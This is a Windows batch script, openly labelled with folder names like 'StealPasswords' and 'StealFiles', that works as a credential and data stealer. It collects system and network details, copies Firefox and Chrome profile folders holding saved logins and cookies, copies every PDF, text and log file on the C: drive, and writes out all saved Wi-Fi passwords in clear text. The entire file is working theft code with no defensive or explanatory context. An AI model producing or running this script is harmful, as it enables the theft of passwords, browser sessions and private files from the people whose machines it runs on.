@echo off
setlocal enabledelayedexpansion

if not exist ".\StealInfo" md ".\StealInfo"
cd .\StealInfo
systeminfo > systeminfo.txt
ipconfig > ipconfig.txt
netsh wlan show profile > netshwlanshowprofile.txt
netstat > netstat.txt
wmic logicaldisk where drivetype=2 get deviceid, volumename > wmic.txt
cd ..

if not exist ".\StealPasswords" md ".\StealPasswords"
cd StealPasswords
xcopy "%APPDATA%\Mozilla\Firefox\Profiles" .\ /s /e /i /c /h /r /k
xcopy "%USERPROFILE%\Appdata\Local\Google\Chrome\User Data\Default" .\ /s /e /i /c /h /r /k
cd ..

if not exist ".\StealFiles" md ".\StealFiles"
cd .\StealFiles
for /R C:\ %%x in (*.pdf *.txt *.log) do copy "%%x" ".\"
cd ..

if not exist ".\StealWifiPasswords" md ".\StealWifiPasswords"
cd .\StealWifiPasswords
echo Listing all wireless profiles...

set "password_log=Wifi_Passwords_%ComputerName%.txt"
echo [SSID] : "Password" > "%password_log%"

for /f "skip=2 delims=: tokens=2" %%a in ('netsh wlan show profiles') do (
  if not "%%a"=="" (
    set "ssid=%%a"
    set "ssid=!ssid:~1!"
    call :get_password "!ssid!"
  )
)

exit /b

:get_password
set "name=%~1"
set "name=!name:"=!"
set "passwd="
for /f "delims=: tokens=2" %%a in ('netsh wlan show profiles %1 key^=clear ^| find /i "Cont"') do (
  set "passwd=%%a"
)

if defined passwd (
  set "passwd=!passwd:~1!"
  echo [!name!] : "!passwd!" >> "%password_log%"
) else (
  echo [!name!] : The Password is empty >> "%password_log%"
)

exit /b
